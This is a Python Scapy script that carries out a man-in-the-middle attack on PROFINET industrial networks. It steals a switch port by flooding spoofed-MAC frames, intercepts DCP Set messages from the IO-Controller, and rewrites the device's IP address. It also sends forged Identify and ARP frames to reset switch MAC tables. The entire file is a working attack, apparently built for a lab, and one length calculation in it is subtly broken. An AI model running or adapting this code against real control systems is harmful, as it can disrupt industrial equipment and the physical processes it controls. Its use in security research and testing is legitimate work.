from scapy.all import *
import time

# from profinet_controller.protocol_machines.cpm.messages.pnio_ps import *
import scapy.all as scapy
from scapy.contrib.pnio import *
from scapy.contrib.pnio_dcp import *

scapy.load_contrib("pnio_dcp")
scapy.load_contrib("pnio")

# ---------------------------------------------------------------
# DESCRIPTION
# We want to forge the DCP-Communication between IO-Device and
# IO-Controller to forge the IP and NameOfStation Attributes
# of the DCP-Messages to manipulate the network parameters
# of the IO-Device.
# ---------------------------------------------------------------

# it is important for the mitm attack if name of device is set
# because that is required for reinitializing the Switches mactable
station_name = ""

# IDENT Message is required to reset the MAC-Table in the switch
# to right entries
def get_ident_msg(src, name_of_station):
    ether = scapy.Ether(dst="01:0e:cf:00:00:00", src=src, type=0x8892)
    pnio_msg = ProfinetIO(frameID=DCP_IDENTIFY_REQUEST_FRAME_ID)

    if name_of_station == "":
        dcp_data_length = 0
    else:
        dcp_data_length = len(name_of_station)
        +(5 if len(name_of_station) % 2 == 1 else 4)

    pnio_dcp_ident = ProfinetDCP(
        service_id=DCP_SERVICE_ID_IDENTIFY,
        service_type=DCP_REQUEST,
        xid=0x9A,
        reserved=1,
        dcp_data_length=dcp_data_length,  # if set 0, all devices with no name answer
        option=0x02,
        sub_option=0x02,
        dcp_block_length=len(name_of_station),
        name_of_station=name_of_station,
    )
    return ether / pnio_msg / pnio_dcp_ident

def get_ident_arp_msg(src, destIP): 
    return scapy.Ether(src=src, dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=destIP)

# 00:1D:9C:C7:B0:70
# attacker-eth0
def stealPort(macAddress, iface):
    t = threading.currentThread()
    while getattr(t, "do_run", True):
        sendp(
            scapy.Ether(src=macAddress, dst="ff:ff:ff:ff:ff:ff"), iface=iface, verbose=False
        )
        time.sleep(0.05)


def forgeMessages(realAddress, srcAddress, destAddress, iface):
    def update_load(pkt):
        if pkt.haslayer("Profinet DCP"):
            if pkt["Profinet DCP"].service_id == 4 and pkt["Profinet DCP"].service_type==0: 
                pkt.show2()
                steal.do_run = False
                reset_msg_device = get_ident_msg(src=realAddress, name_of_station=station_name)
                reset_msg_controller = get_ident_arp_msg(src=realAddress, destIP="192.168.1.10")
                scapy.sendp(reset_msg_device, iface=iface)
                pkt["Profinet DCP"].ip = "192.168.1.61"
                ans, _ = scapy.srp(pkt, iface=iface)
                dcp_rsp = ans[-1].answer
                time.sleep(0.02)
                scapy.sendp(reset_msg_controller, iface=iface, filter=f"ether src {srcAddress}")
                time.sleep(0.02)
                scapy.sendp(dcp_rsp, iface=iface)
                time.sleep(0.02)
                scapy.sendp(reset_msg_device, iface=iface)
                t = threading.currentThread()
                t.do_run = False

    def stopFilter(x): 
        t = threading.currentThread()
        return not getattr(t, "do_run", True)

    sniff(
        filter=f"ether src {srcAddress} and ether proto 0x8892",
        store=0,
        count=-1,
        prn=update_load,
        iface=iface,
        stop_filter=stopFilter
    )


steal = threading.Thread(target=stealPort, args=["00:1D:9C:C8:BD:13", "attacker-eth0"])
forge = threading.Thread(
    target=forgeMessages,
    args=[
        "00:1D:9C:C8:BD:18",
        "00:1D:9C:C7:B0:70",
        "00:1D:9C:C8:BD:13",
        "attacker-eth0",
    ]
)

steal.start()
forge.start()

# time.sleep(30)

# if steal.is_alive():
#     steal.join()
# if forge.is_alive():
#     forge.join()
